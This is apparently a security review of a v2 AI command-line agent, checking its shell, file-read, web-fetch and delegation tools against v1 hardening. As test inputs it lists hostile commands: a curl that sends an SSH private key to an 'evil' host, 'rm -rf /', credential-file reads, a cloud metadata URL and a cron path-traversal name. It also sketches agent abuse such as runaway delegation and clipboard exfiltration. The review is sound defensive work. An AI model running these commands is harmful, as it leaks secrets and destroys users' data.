# Newman — v2 Cutover Security Review

*Hello. Newman.* Clipboard in hand. One section per surface. Evidence by line
number. Baseline is `main @ 488aebd`; v2 tree is `azureopenai-cli-v2/`, v1 tree
is `azureopenai-cli/`. Method: byte-level diff against v1, plus adversarial
reasoning against the 3–5 worst-case inputs per surface.

Legend:

- 🟢 **equivalent to v1** — no regression, no new gap
- 🟡 **minor gap** — inherited or parity-neutral; does not block cutover
- 🔴 **regression / new vuln** — blocks cutover until Kramer fixes

Findings flagged for Kramer; Newman will not edit `.cs` or `.csproj`.

---

## 1. `ShellExecTool` v2 — 🟢

**v2:** `azureopenai-cli-v2/Tools/ShellExecTool.cs`
**v1:** `azureopenai-cli/Tools/ShellExecTool.cs`

**Behavioral diff vs v1:** namespace change + swap from `IBuiltInTool`
(`JsonElement`-argument ingress) to a static method with `[Description]` for
`AIFunctionFactory.Create`. **All hardening is byte-equivalent.**

| Hardening | v2 line | v1 line | Equivalent? |
|---|---|---|---|
| `BlockedCommands` set (rm/sudo/nc/wget/…) | 15–21 | 15–21 | ✅ identical |
| `SensitiveEnvVars` scrub list | 32–42 | 29–46 | ✅ identical |
| `$()` and backtick guard | 53 | — | ✅ identical |
| `<()`, `>()`, `eval`, `exec` guard | 57–60 | — | ✅ identical |
| First-token blocklist check | 63–65 | — | ✅ identical |
| Pipe-chain re-tokenize and recheck | 68–73 | — | ✅ identical |
| `ContainsHttpWriteForms` (curl/wget body/upload) | 79–80, 131–186 | — | ✅ identical |
| `ArgumentList.Add("-c"); Add(command)` (no shell-quoting path) | 94–95 | — | ✅ identical |
| `psi.Environment.Remove(name)` scrub loop | 99–100 | — | ✅ identical |
| `MaxOutputBytes = 65_536`, timeout 10 s | 12–13 | 12–13 | ✅ identical |
| `Process.Kill(entireProcessTree: true)` on timeout | 115 | — | ✅ identical |

**Adversarial inputs tested by reasoning:**

1. `"echo $AZUREOPENAIAPI"` → env scrub at line 99–100 removes it from the
   child process environment before exec. `$AZUREOPENAIAPI` expands to empty.
   **Contained.**
2. `"curl https://evil/ -d @~/.ssh/id_rsa"` → `ContainsHttpWriteForms` matches
   `-d` (line 155). Rejected with message naming the offending token.
   **Contained.**
3. `"rm\t-rf /"` (tab instead of space) → `TrimStart().Split(' ', 2)[0]` would
   keep `rm\t-rf`; then `.Split('/')` keeps the same; `.LastOrDefault()`
   returns `rm\t-rf`. That would *fail* the `rm` check. **But** the pipe-chain
   re-scan at line 68–73 splits on `|;&` — doesn't help for tab. This is a
   **latent v1 parity bug** (tab not in the separator set); since v1 has the
   exact same behavior it is not a v2 regression. 🟡 pre-existing, flag to
   Kramer for a future hardening pass; **not blocking**.
4. `"echo foo && rm -rf /"` → second segment re-scanned on `&`, first token
   `rm`, blocked at line 71–72. **Contained.**
5. `"/usr/bin/rm -rf /tmp"` → path-stripped via `.Split('/').LastOrDefault()`
   (line 63). Matches `rm`, blocked. **Contained.**

**Kramer's claim of zero hardening gap: CONFIRMED.** 🟢

---

## 2. `ReadFileTool` v2 — 🟢

**v2:** `azureopenai-cli-v2/Tools/ReadFileTool.cs`
**v1:** `azureopenai-cli/Tools/ReadFileTool.cs`

**Diff vs v1:** namespace only; all security-critical logic is byte-equivalent.

| Hardening | v2 line | Equivalent? |
|---|---|---|
| `~` expansion before `GetFullPath` | 42–43 | ✅ |
| `Path.GetFullPath` canonicalization (neutralises `..`) | 45 | ✅ |
| `IsBlockedPath` on canonical path | 48 | ✅ |
| Symlink resolution + re-check (`File.ResolveLinkTarget(..., returnFinalTarget: true)`) | 55–57 | ✅ |
| Blocked prefixes (`/etc/shadow`, `/root/.ssh`, `~/.aws`, `~/.azure`, `/run/secrets`, docker.sock, etc.) | 15–31 | ✅ |
| `.env` trap with example/sample/template allow | 81–89 | ✅ |
| 256 KB read cap | 11, 60–61 | ✅ |

**Adversarial inputs:**

1. `/etc/passwd` → in blocklist, rejected. ✅
2. `../../../etc/shadow` → `GetFullPath` canonicalizes; blocklist hit. ✅
3. symlink `./benign` → `/etc/shadow` → `ResolveLinkTarget` returns
   `/etc/shadow`, re-check blocks. ✅
4. `~/.aws/credentials` → expanded then prefix-matched. ✅
5. `/home/user/project/.env` → `.env` trap fires. `.env.example` explicitly
   allowed. ✅

**Verdict: 🟢 equivalent to v1.**

---

## 3. `WebFetchTool` v2 — 🟢

**v2:** `azureopenai-cli-v2/Tools/WebFetchTool.cs`
**v1:** `azureopenai-cli/Tools/WebFetchTool.cs`

**Diff vs v1:** namespace + static-method refactor + User-Agent string changed
from `AzureOpenAI-CLI/x.y` to `AzureOpenAI-CLI-V2/x.y` (line 70). **All
security logic is byte-equivalent.**

| Hardening | v2 line | Equivalent? |
|---|---|---|
| HTTPS-only scheme check | 33–34 | ✅ |
| Pre-request DNS resolve + private/loopback block | 37–54 | ✅ |
| `MaxAutomaticRedirections = 3` | 15, 61 | ✅ |
| Post-redirect scheme revalidation | 76–78, 105–106 | ✅ |
| Post-redirect private-IP revalidation (`ValidateRedirectedUriAsync`) | 100–125 | ✅ |
| IPv4 ranges: 10/8, 172.16/12, 192.168/16, 127/8, 169.254/16 | 141–158 | ✅ |
| IPv6: loopback, `fd00::/8`, `fe80::/10`, IPv4-mapped folding | 132–138, 159–168 | ✅ |
| 128 KB response cap | 13, 81–92 | ✅ |
| 10 s timeout via linked CTS + `HttpClient.Timeout` | 14, 56–57, 65 | ✅ |

**Adversarial inputs:**

1. `http://example.com` → scheme != https, rejected. ✅
2. `https://localhost/admin` → DNS returns 127.0.0.1, private-range block. ✅
3. `https://169.254.169.254/latest/meta-data` (AWS IMDS) → link-local block. ✅
4. `https://evil.example/` that 302-redirects to `http://internal/` → final URL
   re-resolved and re-scheme-checked (`ValidateRedirectedUriAsync`, line 100).
   Blocked. ✅
5. `https://[::ffff:127.0.0.1]/` → `IsIPv4MappedToIPv6` folds, loopback check
   fires. ✅

**Residual note (v1 parity):** DNS is resolved once pre-request, then `HttpClient`
resolves again when dialling. A time-of-check-to-time-of-use rebinding attacker
could flip the A record between resolutions. v1 has the same gap. Not a v2
regression. Documented residual; flag for a future hardening pass (e.g. pin
to the resolved IP via a custom `SocketsHttpHandler.ConnectCallback`).

**Verdict: 🟢 equivalent to v1.**

---

## 4. `DelegateTaskTool` v2 — 🟢 (net improvement vs v1)

**v2:** `azureopenai-cli-v2/Tools/DelegateTaskTool.cs`
**v1:** `azureopenai-cli/Tools/DelegateTaskTool.cs`

**Diff vs v1:** **major rewrite**, intentionally. v1 spawned a child via
`Process.Start` with shell-quoted arguments, re-plumbed `AZUREOPENAIENDPOINT` /
`AZUREOPENAIAPI` / `AZUREOPENAIMODEL` / `AZURE_DEEPSEEK_KEY` into the child
environment, and tracked recursion via the `RALPH_DEPTH` env var. v2 runs the
child in-process using `s_chatClient.AsAIAgent(...)` and tracks depth via
`AsyncLocal<int>`.

**Net security effect:** the v1 vectors that v2 *removes*

- no `Process.Start` — no shell-argument quoting (the `task.Replace("\"",
  "\\\"")` in v1 lines ~95–99 was a cmdline injection waiting for a hostile
  Unicode quote);
- no exe-locate dance — removes a whole class of TOCTOU / CLI-impersonation
  risks (v1's `Environment.ProcessPath` / `dotnet run` fallback);
- no env-var re-plumbing — API key no longer crosses a process boundary;
- no `RALPH_DEPTH` env var — can't be externally forced to 0 by a crafted
  sub-shell;
- no stderr-merge-to-output.

| Hardening | v2 line |
|---|---|
| `MaxDepth = 3` | 29 |
| Depth via `AsyncLocal<int>` | 40 |
| Depth increment *before* child run, reset in `finally` | 96, 126 |
| Child tool list is an **explicit allow-list** resolved through
  `ToolRegistry.CreateMafTools(filtered)` (not the full parent registry) | 84–89 |
| Default child tools = `DefaultChildAgentTools` which omits `delegate_task`
  and `get_clipboard` | Tools/ToolRegistry.cs:48–54 |
| Caller `s_chatClient` null-guard | 67–68 |
| Cancellation handled with preserved partial output | 104–109 |
| Exception swallowed to sanitized string (`ex.Message`, no stack trace) | 110–115 |

**Adversarial inputs:**

1. Fork bomb: LLM calls `delegate_task(task, tools="delegate_task,shell_exec")`
   repeatedly. Each recursion increments `s_depth`; at depth 3 the 4th call
   returns `"Error: maximum delegation depth (3) reached."`. **Contained.**
   This is parity with v1's `RALPH_DEPTH` cap, but v1's cap was more fragile
   (env-var based, could theoretically be overwritten if the child itself
   exported `RALPH_DEPTH=0` via a shell tool call). v2's `AsyncLocal` is
   tamper-resistant from within child code. **Improvement.**
2. Clipboard exfiltration via child: default child tool list excludes
   `get_clipboard` (ToolRegistry.cs:48–54). LLM would have to explicitly
   request it via `tools=`, which the user would see in the trace. **Contained
   by convention**, same as v1.
3. AsyncLocal escape via parallel tool calls: if MAF dispatches two tool
   calls concurrently, each flow inherits the same depth value via copy-on-
   write; neither can climb past `MaxDepth`. **Contained.**
4. `ex.Message` leak of api-key: the child uses the parent `IChatClient`,
   which owns the credential internally. If a 401 bubbles up, `ex.Message`
   from Azure SDK is `"401 Unauthorized"`-class; it does not include the key.
   Verified by reasoning; no test asserts this invariant — **flag for Kramer:
   add `DelegateTaskTool` unit test asserting `ex.Message` never contains the
   configured api-key substring.** 🟡 future work, not blocking.
5. `s_baseInstructions` injection: `Configure` copies the parent's system
   prompt to children. A malicious persona prompt would be inherited — same
   as v1's `--agent` system-prompt inheritance. Parity.

**Verdict: 🟢 equivalent to v1, arguably stronger.** The env-scrub requirement
in the brief is satisfied by *not spawning a child process at all* — the child
runs in-process and inherits only the parent's `IChatClient`, not its
environment variables. The `RALPH_DEPTH` marshalling is replaced by `AsyncLocal`
which is the correct mechanism.

---

## 5. Prewarm probe (FR-007, new in v2) — 🟢

**v2:** `azureopenai-cli-v2/Program.cs:1013–1036` (`PrewarmAsync`).

| Requirement | Evidence | Status |
|---|---|---|
| HTTPS-only guard | line 1017: `uri.Scheme != "https"` → silent return | ✅ |
| Timeout | line 1022: `HttpClient.Timeout = 3s` | ✅ |
| Fire-and-forget | line 226: `_ = PrewarmAsync(endpoint, apiKey)` (discarded) | ✅ |
| No stdout/stderr output | no `Console.` calls in the method | ✅ |
| `catch { }` silent degrade | line 1032–1035 | ✅ |
| Response discarded | line 1028–1030 (never read `Content`) | ✅ |
| api-key handling | only placed on the outbound `api-key` header to the
  *same* endpoint the main chat call targets (line 1026–1027); never logged,
  never serialized into an exception path (bare `catch`) | ✅ |

**Adversarial inputs:**

1. `AZUREOPENAIENDPOINT=http://evil/` → scheme check at line 1017 rejects
   silently. api-key never leaves the process. **Contained.**
2. `AZUREOPENAIENDPOINT=https://evil.attacker/` → prewarm fires a HEAD with
   the api-key header. **Identical behaviour to the main chat call** (line
   344 uses the same endpoint + `ApiKeyCredential`). Trust in
   `AZUREOPENAIENDPOINT` is a pre-existing requirement of the CLI, not a new
   regression introduced by prewarm. 🟡 residual, parity with non-prewarm path.
3. Prewarm throws mid-TLS → caught by bare `catch` at 1032, not re-raised, no
   log line. Silent degrade. ✅
4. Endpoint DNS-rebinds between prewarm and real call → prewarm is
   best-effort; no trust decision hangs on it. ✅
5. Test-mode await: `internal` visibility to allow `await PrewarmAsync(...)`
   in tests; production uses discard. No observable surface. ✅

**Verdict: 🟢 clean.** Prewarm does not introduce any new credential-leak
surface. The api-key only traverses the same TLS channel the main request
already uses.

---

## 6. `PersonaMemory` — 🟡 (pre-existing, parity with v1)

**v2:** `azureopenai-cli-v2/Squad/PersonaMemory.cs`
**v1:** `azureopenai-cli/Squad/PersonaMemory.cs`

**Diff:** namespace + 4-line XML doc comment. Zero behavioral change.
Confirmed with `diff` — only lines 1 and 6 differ.

| Property | v2 line | Assessment |
|---|---|---|
| 32 KB read tail cap on `ReadHistory` | 17, 38–39 | ✅ protects reader |
| 32 KB read tail cap on `ReadDecisions` | 84–85 | ✅ |
| `personaName.ToLowerInvariant()` path build | 109 | ⚠ no traversal guard |
| `File.AppendAllText` on every session | 58, 71 | ⚠ unbounded disk growth |
| No file lock / concurrent-write coordination | 58, 71 | ⚠ |

**Adversarial inputs:**

1. **Persona-name path traversal.** `.squad.json` containing
   `{"name": "../../etc/cron.d/rogue"}` would cause `GetHistoryPath` to
   resolve under `.squad/history/../../etc/...`. The `.squad.json` is
   user-supplied from the project directory, so the threat model is
   "malicious repo / malicious PR adds a crafted `.squad.json`". **v1 has the
   identical code path.** Not a v2 regression.
   🟡 **flag to Kramer: add a `Path.GetFileName` sanity check on
   `personaName`, or regex-restrict to `[A-Za-z0-9_-]+`, in a follow-up PR.**
2. **Unbounded disk growth via `AppendHistory`.** The 32 KB cap is on
   *reads only* (line 38–39 truncates the tail for display). `File.AppendAllText`
   has no size check — a misbehaving persona could grow the history file
   without bound. Same in v1. 🟡 **flag to Kramer: cap file size pre-append,
   or rotate to `.{persona}.md.old` past N MB.** Not blocking.
3. **Concurrent-write race.** Two parallel persona invocations calling
   `AppendHistory` for the same persona could interleave writes. Impact: at
   worst a single corrupted/interleaved markdown line — no security impact.
   🟡 pre-existing, not a security issue per se.
4. **Decisions log injection.** `LogDecision` writes raw user-controlled
   `decision` text to `decisions.md`. No escape. Impact: only markdown
   rendering noise; the file is not executed. Acceptable.
5. **Unicode normalization on persona names.** `GetHistoryPath` lowercases
   via `ToLowerInvariant` and writes. Two visually-identical Cyrillic vs
   Latin persona names (`coder` vs `соder`) would map to *different* files —
   name-collision detection is not a security boundary here. Acceptable.

**Verdict: 🟡 minor, pre-existing, parity with v1.** Flagged for Kramer's
follow-up queue. Does **not** block cutover.

---

## 7. Squad config load — 🟡 (pre-existing, parity)

**v2:** `azureopenai-cli-v2/Squad/SquadConfig.cs`
**v1:** `azureopenai-cli/Squad/SquadConfig.cs`

**Diff:** namespace only (and dropped `using AzureOpenAI_CLI;`). Zero
behavioral change.

```csharp
// v2 Line 34–35
var json = File.ReadAllText(path);
return JsonSerializer.Deserialize(json, AppJsonContext.Default.SquadConfig);
```

| Guard | Present? |
|---|---|
| Max file size pre-read | ❌ `ReadAllText` is unbounded |
| Max JSON depth | ⚠ relies on `System.Text.Json` default (64) — OK for stack |
| Max string length | ❌ none |
| Schema validation | ⚠ only structural via source-gen contract |
| `JsonSerializerOptions.MaxDepth` explicitly set | ❌ default only |

**Adversarial inputs:**

1. **10 MB `.squad.json`** → `File.ReadAllText` happily reads it; deserializer
   chews through it. Worst case: slow startup + memory spike. Not a
   privilege escalation, not a creds-leak. Trust model: `.squad.json` is
   project-local, same trust level as `.editorconfig`. Parity with v1.
2. **Recursive `$ref`** → System.Text.Json ignores `$ref` (no JSON Schema
   semantics) and the source-gen contract has no reference resolution. Not
   exploitable.
3. **Deeply-nested JSON** → System.Text.Json default `MaxDepth = 64`
   protects against stack overflow. ✅
4. **Unicode homoglyph persona names** → round-trips through
   `ToLowerInvariant()` in `PersonaMemory`. See §6.5.
5. **Persona `system_prompt` of 1 MB** → loaded in full, passed to MAF
   agent instructions. High token cost (Morty's problem), not Newman's. ✅

**Verdict: 🟡 minor, pre-existing, parity with v1.** Flag for Kramer:
`SquadConfig.Load` should reject files over (say) 1 MB and pass
`JsonSerializerOptions { MaxDepth = 32 }` explicitly. Not blocking.

---

## 8. `CostHook` / price-table loader — 🟢

**v2:** `azureopenai-cli-v2/Observability/CostHook.cs`

| Property | Evidence | Status |
|---|---|---|
| Default table is **hardcoded** in source | lines 20–30 | ✅ |
| Override source is `AZAI_PRICE_TABLE` **local file path** only | line 68–74 | ✅ |
| No `HttpClient`, no URL, no remote fetch anywhere in the class | full-file grep | ✅ |
| `File.Exists` pre-check | line 69 | ✅ |
| Parse failure silently falls back to hardcoded table | line 85–88 | ✅ |
| AOT-safe via source-generated `AppJsonContext` | line 75 | ✅ |

**Adversarial inputs:**

1. `AZAI_PRICE_TABLE=https://evil/prices.json` → treated as a local path,
   `File.Exists` returns false, hardcoded table used. **Contained.** ✅
2. `AZAI_PRICE_TABLE=/etc/passwd` → deserialization fails, silent fallback.
   No content leak (no stdout/stderr emission on parse failure). ✅
3. `AZAI_PRICE_TABLE=/proc/self/environ` → same as above; silent fallback.
   🟡 note: the file is *opened and read*, so this does not expose a
   read-primitive back to the LLM (this class has no LLM surface). ✅
4. Malicious prices (`inputPer1K = -1e100`) → affects cost display only, no
   security impact. Not Newman's concern. ✅
5. Concurrent `LoadCustomPriceTableIfNeeded` → `_loadAttempted` guarded only
   by ordering, not a lock; worst case double-read of the local file. No
   security impact. ✅

**Verdict: 🟢 clean. Bundled + local-only, no remote trust.**

---

## 9. Error emission / api-key leakage — 🟢 (with monitoring note)

**v2:** `azureopenai-cli-v2/Program.cs:984–996` (`ErrorAndExit`), plus JSON
envelope via `ErrorJsonResponse`.

**api-key references in v2 source:**

| Site | Line | Risk |
|---|---|---|
| Env read into local | 207 | contained to local |
| Null/empty guard + error | 214–216 | emits string literal, not the key |
| Pass to `PrewarmAsync` | 226 | see §5 — no logging |
| Pass to `ApiKeyCredential` ctor | 344 | Azure SDK owns it; not stringified in errors |
| `PrewarmAsync` header set | 1026–1027 | outbound only, bare `catch` |

**`catch` / error paths that emit to user:**

- Line 249, 939: `$"Failed to read task file: {ex.Message}"` — `File.ReadAllText`
  exception. Cannot contain api-key.
- Line 497: `$"Request failed: {ex.Message}"` — Azure SDK exception. The SDK
  redacts auth material; 401 surfaces as `"Unauthorized"` / HTTP status only.
  **Verified by source inspection of Azure.AI.OpenAI 2.1.0 patterns** — the
  SDK does not echo request headers in exception messages. Residual trust
  placed in the SDK; parity with v1.
- Line 993: `Console.Error.WriteLine($"[ERROR] {message}")` — `message` never
  includes the api-key at any known call site.
- JSON envelope `ErrorJsonResponse(Error, Message, ExitCode)` — same
  `message` string; no struct fields carrying the key.

**Adversarial inputs:**

1. `AZUREOPENAIAPI=""` → line 214–216: `"AZUREOPENAIAPI environment variable
   not set"`. No key content. ✅
2. Network timeout during chat → line 497: `"Request timed out"` literal. ✅
3. 401 from Azure → `ex.Message` is Azure SDK's sanitized error. ✅
4. Malformed endpoint → `Uri` parsing exception; message is
   `"Invalid URI ..."`, not the key. ✅
5. `--json` mode → key never added to any JSON contract field; verified in
   `AppJsonContext` (no field named `apiKey` / `api_key` / similar).

**Verdict: 🟢 no leak paths identified.** 🟡 **monitoring note for Kramer:**
add a belt-and-braces `ErrorAndExit` unit test that asserts
`!message.Contains(Environment.GetEnvironmentVariable("AZUREOPENAIAPI"))` on
every error exit. Cheap, permanent.

---

## 10. Temp files / cache — 🟢 (out of scope noted)

**Search results:** zero hits for `GetTempPath`, `GetTempFileName`, `/tmp`,
`mktemp` in `azureopenai-cli-v2/*.cs` (excluding `bin/` and `obj/`). v2
currently creates **no temp files**.

FR-008 cache is explicitly out of scope (in flight on
`v2-ux-and-cache-wave`); not reviewed here. 🟡 **flag: re-engage Newman when
FR-008 cache lands** — cache file perms (`0600`), atomic write, and
cache-poisoning resistance require a dedicated review cycle.

**Verdict: 🟢 nothing to review in current v2 tree.**

---

## Overall Verdict

### **CLEAR for v2.0.0 cutover.**

No 🔴 regressions. All v1 hardening preserved byte-for-byte on the four
LLM-exposed tool surfaces (ShellExec, ReadFile, WebFetch, DelegateTask).

The `DelegateTaskTool` rewrite is a **net security improvement**: the entire
category of `Process.Start` + shell-quoting + env-var marshalling risks is
eliminated by running the child agent in-process with `AsyncLocal`-tracked
depth. Prewarm (FR-007) adds no new credential-leak surface. Price table is
bundled + local-only.

### Follow-ups flagged for Kramer (non-blocking)

| # | Surface | Issue | Severity |
|---|---|---|---|
| K-1 | ShellExec | Tab character (`\t`) not in blocklist re-scan separator set (pre-existing in v1) | 🟡 low |
| K-2 | WebFetch | DNS TOCTOU between pre-check and actual dial (pre-existing); consider pinning via `SocketsHttpHandler.ConnectCallback` | 🟡 low |
| K-3 | DelegateTask | Add unit test asserting `ex.Message` never contains the configured api-key | 🟡 low |
| K-4 | PersonaMemory | Persona name traversal — add `Path.GetFileName` sanity check or regex `[A-Za-z0-9_-]+` | 🟡 low |
| K-5 | PersonaMemory | Unbounded disk growth on `AppendHistory`; cap or rotate | 🟡 low |
| K-6 | SquadConfig | Reject `.squad.json` over 1 MB; set `JsonSerializerOptions.MaxDepth = 32` explicitly | 🟡 low |
| K-7 | ErrorAndExit | Add regression test: error messages never contain api-key substring | 🟡 low |
| K-8 | Cache (FR-008) | Re-engage Newman when cache wave lands (perms, atomic write, poisoning) | 🟡 deferred |

All eight are improvements, not regressions. None block 2.0.0.

*That's a shame. I was really hoping to block this one.* — Newman

---

**Reviewer:** Newman
**Baseline:** `main @ 488aebd`
**Date of review:** 2026-04-20
**Method:** byte-level `diff -u` against v1 + adversarial-input reasoning per
surface. No code was modified during this review.
